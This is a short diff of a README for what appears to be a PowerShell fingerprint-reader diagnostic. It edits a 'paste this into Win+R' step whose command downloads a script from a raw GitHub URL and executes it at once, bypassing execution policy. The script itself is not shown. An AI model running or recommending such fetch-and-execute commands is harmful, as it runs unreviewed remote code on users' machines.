@@ -4,7 +4,7 @@ A single-file PowerShell diagnostic that checks whether the fingerprint reader o
 
 ## Run it
 
-Press **Win+R**, paste this, and press Enter (replace `<user>` and `<repo>` with your GitHub username and repository name):
+Press **Win+R**, paste this
 
 ```
 powershell -ep bypass -nop -c "irm https://raw.githubusercontent.com/SkermiebroTech/my-wiki/main/fp-test.ps1 | iex"
